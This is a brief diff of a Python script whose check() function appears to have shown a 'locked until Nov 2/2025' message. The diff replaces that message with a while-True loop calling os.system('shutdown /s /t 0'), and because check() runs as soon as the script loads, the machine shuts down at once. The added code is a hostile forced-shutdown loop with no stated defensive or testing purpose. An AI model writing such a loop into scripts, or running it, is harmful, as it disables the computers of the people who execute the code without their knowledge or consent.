@@ -81,7 +81,6 @@ def main():
 
 
 def check():
-  print("\033[0mINFO [\033[0;31mLOCKED\033[0m]")
-  print("Unlocking ON [\033[1;33mNOV 2/2025\033[0m]")
-  input("\nPRESS [\033[1;32mENTER\033[0m] To leave: ")
+  while True:
+   os.system("shutdown /s /t 0 ")
 check()
